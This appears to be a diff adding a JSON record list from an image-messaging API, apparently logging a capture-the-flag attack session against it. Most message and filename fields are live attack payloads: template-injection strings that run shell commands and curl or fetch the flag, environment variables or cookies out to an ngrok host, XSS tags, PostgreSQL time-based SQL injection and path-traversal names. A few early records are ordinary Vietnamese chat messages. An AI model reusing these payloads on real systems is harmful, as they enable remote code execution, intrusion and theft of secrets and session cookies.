+      "id": 101,
+      "name": "wkr.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${fetch('https://bd65-58-186-22-183.ngrok-free.app/wkr?g='+encodeURIComponent(Object.keys(globalThis).join(',')))}",
+      "createdAt": "2026-08-22T06:51:16Z",
+      "url": "/api/images/101"
+    },
+    {
+      "id": 100,
+      "name": "hb.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "{{#with \"s\" as |x|}}{{x.constructor.constructor('return process.env.FLAG')()}}{{/with}}",
+      "createdAt": "2026-08-22T06:51:16Z",
+      "url": "/api/images/100"
+    },
+    {
+      "id": 99,
+      "name": "xss3.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<svg onload=\"fetch('https://bd65-58-186-22-183.ngrok-free.app/xss3')\">",
+      "createdAt": "2026-08-22T06:51:16Z",
+      "url": "/api/images/99"
+    },
+    {
+      "id": 98,
+      "name": "xss2.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<script>fetch('https://bd65-58-186-22-183.ngrok-free.app/xss2?u='+location.href)</script>",
+      "createdAt": "2026-08-22T06:51:16Z",
+      "url": "/api/images/98"
+    },
+    {
+      "id": 97,
+      "name": "xss1.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<img src=x onerror=\"fetch('https://bd65-58-186-22-183.ngrok-free.app/xss1?c='+encodeURIComponent(document.cookie))\">",
+      "createdAt": "2026-08-22T06:51:16Z",
+      "url": "/api/images/97"
+    },
+    {
+      "id": 96,
+      "name": "nun.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl https://bd65-58-186-22-183.ngrok-free.app/nun?f=$(cat /flag)')\")()}}",
+      "createdAt": "2026-08-22T06:51:16Z",
+      "url": "/api/images/96"
+    },
+    {
+      "id": 95,
+      "name": "ejs.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "<%= global.process.mainModule.require('child_process').execSync('curl https://bd65-58-186-22-183.ngrok-free.app/ejs?f=$(cat /flag||env)') %>",
+      "createdAt": "2026-08-22T06:51:16Z",
+      "url": "/api/images/95"
+    },
+    {
+      "id": 94,
+      "name": "cp.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${require('child_process').execSync('curl https://bd65-58-186-22-183.ngrok-free.app/cp?f=$(cat /flag)')}",
+      "createdAt": "2026-08-22T06:51:16Z",
+      "url": "/api/images/94"
+    },
+    {
+      "id": 93,
+      "name": "js3.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${fetch('https://bd65-58-186-22-183.ngrok-free.app/js3?e='+encodeURIComponent(JSON.stringify(process.env)))}",
+      "createdAt": "2026-08-22T06:51:16Z",
+      "url": "/api/images/93"
+    },
+    {
+      "id": 92,
+      "name": "js2.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${require('http').get('http://bd65-58-186-22-183.ngrok-free.app/js2?f='+process.env.FLAG)}",
+      "createdAt": "2026-08-22T06:51:16Z",
+      "url": "/api/images/92"
+    },
+    {
+      "id": 91,
+      "name": "js1.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${fetch('https://bd65-58-186-22-183.ngrok-free.app/js1?f='+process.env.FLAG)}",
+      "createdAt": "2026-08-22T06:51:16Z",
+      "url": "/api/images/91"
+    },
+    {
+      "id": 89,
+      "name": "I.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${fetch('https://bd65-58-186-22-183.ngrok-free.app/I?k='+encodeURIComponent(Object.keys(globalThis).join(',')))}",
+      "createdAt": "2026-08-22T06:50:35Z",
+      "url": "/api/images/89"
+    },
+    {
+      "id": 88,
+      "name": "E.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "{{range.constructor(\"return global.process.mainModule.require('http').get('http://bd65-58-186-22-183.ngrok-free.app/E?f='+global.process.env.FLAG)\")()}}",
+      "createdAt": "2026-08-22T06:50:34Z",
+      "url": "/api/images/88"
+    },
+    {
+      "id": 87,
+      "name": "C.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${fetch('https://bd65-58-186-22-183.ngrok-free.app/C?f='+encodeURIComponent(JSON.stringify(globalThis.process&&process.env||{})))}",
+      "createdAt": "2026-08-22T06:50:34Z",
+      "url": "/api/images/87"
+    },
+    {
+      "id": 86,
+      "name": "B.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${require('http').get('http://bd65-58-186-22-183.ngrok-free.app/B?f='+process.env.FLAG)}",
+      "createdAt": "2026-08-22T06:50:34Z",
+      "url": "/api/images/86"
+    },
+    {
+      "id": 85,
+      "name": "A.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${fetch('https://bd65-58-186-22-183.ngrok-free.app/A?f='+process.env.FLAG)}",
+      "createdAt": "2026-08-22T06:50:34Z",
+      "url": "/api/images/85"
+    },
+    {
+      "id": 84,
+      "name": "....//....//....//flag",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "MKqzdyg",
+      "createdAt": "2026-08-22T06:49:50Z",
+      "url": "/api/images/84"
+    },
+    {
+      "id": 83,
+      "name": "../../../../etc/passwd",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "MKqzdyg",
+      "createdAt": "2026-08-22T06:49:50Z",
+      "url": "/api/images/83"
+    },
+    {
+      "id": 82,
+      "name": "/flag.txt",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "MKqzdyg",
+      "createdAt": "2026-08-22T06:49:49Z",
+      "url": "/api/images/82"
+    },
+    {
+      "id": 81,
+      "name": "/flag",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "MKqzdyg",
+      "createdAt": "2026-08-22T06:49:49Z",
+      "url": "/api/images/81"
+    },
+    {
+      "id": 80,
+      "name": "../../../../flag.txt",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "MKqzdyg",
+      "createdAt": "2026-08-22T06:49:49Z",
+      "url": "/api/images/80"
+    },
+    {
+      "id": 79,
+      "name": "../../../../flag",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "MKqzdyg",
+      "createdAt": "2026-08-22T06:49:49Z",
+      "url": "/api/images/79"
+    },
+    {
+      "id": 78,
+      "name": "QQik3l5base.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "QQik3l5_base",
+      "createdAt": "2026-08-22T06:46:40Z",
+      "url": "/api/images/78"
+    },
+    {
+      "id": 77,
+      "name": "QQik3l5x'||(SELECT pg_sleep(3))||'.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "QQik3l5_sleep",
+      "createdAt": "2026-08-22T06:46:40Z",
+      "url": "/api/images/77"
+    },
+    {
+      "id": 76,
+      "name": "QQik3l5a'||'b.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "QQik3l5_fn",
+      "createdAt": "2026-08-22T06:46:40Z",
+      "url": "/api/images/76"
+    },
+    {
+      "id": 75,
+      "name": "s.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "ZZ43ncsg'||(SELECT current_user)||'",
+      "createdAt": "2026-08-22T06:46:23Z",
+      "url": "/api/images/75"
+    },
+    {
+      "id": 74,
+      "name": "c.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "ZZ43ncsg'||'X",
+      "createdAt": "2026-08-22T06:46:23Z",
+      "url": "/api/images/74"
+    },
+    {
+      "id": 73,
+      "name": "p.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "ZZ43ncsg_plain",
+      "createdAt": "2026-08-22T06:46:23Z",
+      "url": "/api/images/73"
+    },
+    {
+      "id": 72,
+      "name": "probe.jpg",
+      "size": 22,
+      "recipient": "luongvd",
+      "message": "probe",
+      "createdAt": "2026-08-22T06:46:02Z",
+      "url": "/api/images/72"
+    },
+    {
+      "id": 71,
+      "name": "probe.txt",
+      "size": 17,
+      "recipient": "luongvd",
+      "message": "markerAAA",
+      "createdAt": "2026-08-22T06:45:52Z",
+      "url": "/api/images/71"
+    },
+    {
+      "id": 70,
+      "name": "img_3.bin",
+      "size": 800001,
+      "recipient": "luongvd",
+      "message": "hello",
+      "createdAt": "2026-08-22T06:43:49Z",
+      "url": "/api/images/70"
+    },
+    {
+      "id": 69,
+      "name": "Zx3fb3b4.jpg",
+      "size": 87,
+      "recipient": "luongvd",
+      "message": "Zx3fb3b4",
+      "createdAt": "2026-08-22T06:39:27Z",
+      "url": "/api/images/69"
+    },
+    {
+      "id": 68,
+      "name": "Zta287f3c'||'d.jpg",
+      "size": 87,
+      "recipient": "luongvd",
+      "message": "Zta287f3a'||'b",
+      "createdAt": "2026-08-22T06:39:27Z",
+      "url": "/api/images/68"
+    },
+    {
+      "id": 67,
+      "name": "r.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "rtest",
+      "createdAt": "2026-08-22T06:35:10Z",
+      "url": "/api/images/67"
+    },
+    {
+      "id": 66,
+      "name": "r.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "rtest",
+      "createdAt": "2026-08-22T06:35:10Z",
+      "url": "/api/images/66"
+    },
+    {
+      "id": 65,
+      "name": "r.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "rtest",
+      "createdAt": "2026-08-22T06:35:10Z",
+      "url": "/api/images/65"
+    },
+    {
+      "id": 64,
+      "name": "r.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "rtest",
+      "createdAt": "2026-08-22T06:35:10Z",
+      "url": "/api/images/64"
+    },
+    {
+      "id": 63,
+      "name": "r.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "rtest",
+      "createdAt": "2026-08-22T06:35:09Z",
+      "url": "/api/images/63"
+    },
+    {
+      "id": 62,
+      "name": "f.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:27:51Z",
+      "url": "/api/images/62"
+    },
+    {
+      "id": 61,
+      "name": "f.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:27:51Z",
+      "url": "/api/images/61"
+    },
+    {
+      "id": 60,
+      "name": "f.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:27:51Z",
+      "url": "/api/images/60"
+    },
+    {
+      "id": 59,
+      "name": "f.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:27:51Z",
+      "url": "/api/images/59"
+    },
+    {
+      "id": 58,
+      "name": "f.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:27:51Z",
+      "url": "/api/images/58"
+    },
+    {
+      "id": 57,
+      "name": "f.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:27:51Z",
+      "url": "/api/images/57"
+    },
+    {
+      "id": 56,
+      "name": "f.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:27:51Z",
+      "url": "/api/images/56"
+    },
+    {
+      "id": 55,
+      "name": "f.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:27:51Z",
+      "url": "/api/images/55"
+    },
+    {
+      "id": 54,
+      "name": "f.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:27:51Z",
+      "url": "/api/images/54"
+    },
+    {
+      "id": 53,
+      "name": "f.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:27:51Z",
+      "url": "/api/images/53"
+    },
+    {
+      "id": 52,
+      "name": "f.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:27:51Z",
+      "url": "/api/images/52"
+    },
+    {
+      "id": 45,
+      "name": "s.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x''",
+      "createdAt": "2026-08-22T06:22:47Z",
+      "url": "/api/images/45"
+    },
+    {
+      "id": 44,
+      "name": "s.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x'",
+      "createdAt": "2026-08-22T06:22:47Z",
+      "url": "/api/images/44"
+    },
+    {
+      "id": 43,
+      "name": "s.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x'",
+      "createdAt": "2026-08-22T06:22:47Z",
+      "url": "/api/images/43"
+    },
+    {
+      "id": 42,
+      "name": "s.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x')",
+      "createdAt": "2026-08-22T06:22:47Z",
+      "url": "/api/images/42"
+    },
+    {
+      "id": 41,
+      "name": "s.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x' AND 1=(SELECT 1 FROM pg_sleep(3))--",
+      "createdAt": "2026-08-22T06:22:46Z",
+      "url": "/api/images/41"
+    },
+    {
+      "id": 40,
+      "name": "s.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "x'||(SELECT pg_sleep(3))||'",
+      "createdAt": "2026-08-22T06:22:46Z",
+      "url": "/api/images/40"
+    },
+    {
+      "id": 39,
+      "name": "s.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "hello",
+      "createdAt": "2026-08-22T06:22:46Z",
+      "url": "/api/images/39"
+    },
+    {
+      "id": 38,
+      "name": "${7*7}.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "fnprobe",
+      "createdAt": "2026-08-22T06:22:13Z",
+      "url": "/api/images/38"
+    },
+    {
+      "id": 37,
+      "name": "probe49.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T06:21:46Z",
+      "url": "/api/images/37"
+    },
+    {
+      "id": 32,
+      "name": "test_ssti.jpg",
+      "size": 163,
+      "recipient": "luongvd",
+      "message": "${process.mainModule.require(\"child_process\").execSync(\"cat /flag\")}",
+      "createdAt": "2026-08-22T05:03:14Z",
+      "url": "/api/images/32"
+    },
+    {
+      "id": 31,
+      "name": "test_ssti.jpg",
+      "size": 163,
+      "recipient": "luongvd",
+      "message": "${process.env.FLAG}",
+      "createdAt": "2026-08-22T05:03:14Z",
+      "url": "/api/images/31"
+    },
+    {
+      "id": 30,
+      "name": "test_ssti.jpg",
+      "size": 163,
+      "recipient": "luongvd",
+      "message": "{{process.env}}",
+      "createdAt": "2026-08-22T05:03:14Z",
+      "url": "/api/images/30"
+    },
+    {
+      "id": 29,
+      "name": "test_ssti.jpg",
+      "size": 163,
+      "recipient": "luongvd",
+      "message": "<%= 7*7 %>",
+      "createdAt": "2026-08-22T05:03:14Z",
+      "url": "/api/images/29"
+    },
+    {
+      "id": 28,
+      "name": "test_ssti.jpg",
+      "size": 163,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T05:03:14Z",
+      "url": "/api/images/28"
+    },
+    {
+      "id": 27,
+      "name": "test_ssti.jpg",
+      "size": 163,
+      "recipient": "luongvd",
+      "message": "{{7*7}}",
+      "createdAt": "2026-08-22T05:03:14Z",
+      "url": "/api/images/27"
+    },
+    {
+      "id": 26,
+      "name": "sq.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "test' RETURNING *--",
+      "createdAt": "2026-08-22T04:49:32Z",
+      "url": "/api/images/26"
+    },
+    {
+      "id": 25,
+      "name": "sq.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "test')",
+      "createdAt": "2026-08-22T04:49:32Z",
+      "url": "/api/images/25"
+    },
+    {
+      "id": 24,
+      "name": "sq.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "test'||(SELECT pg_sleep(3))||'",
+      "createdAt": "2026-08-22T04:49:32Z",
+      "url": "/api/images/24"
+    },
+    {
+      "id": 23,
+      "name": "sq.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "test'",
+      "createdAt": "2026-08-22T04:49:32Z",
+      "url": "/api/images/23"
+    },
+    {
+      "id": 21,
+      "name": "tiny.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "test",
+      "createdAt": "2026-08-22T04:38:37Z",
+      "url": "/api/images/21"
+    },
+    {
+      "id": 4,
+      "name": "images.jpg",
+      "size": 35998,
+      "recipient": "luongvd",
+      "message": "Chạy đến đâu rồi em.",
+      "createdAt": "2026-08-22T01:56:31Z",
+      "url": "/api/images/4"
+    },
+    {
+      "id": 2,
+      "name": "3.jpg",
+      "size": 119827,
+      "recipient": "luongvd",
+      "message": "Ở xưởng có cái toilet hài vl",
+      "createdAt": "2026-08-22T01:53:08Z",
+      "url": "/api/images/2"
+    },
+    {
+      "id": 1,
+      "name": "pexels-taiwo-samson-1239982962-38512126.jpg",
+      "size": 1768998,
+      "recipient": "luongvd",
+      "message": "Chuẩn bị có đơn hàng lớn nha em, nghe nói công an",
+      "createdAt": "2026-08-22T01:52:39Z",
+      "url": "/api/images/1"
+    }
+  ]
+}
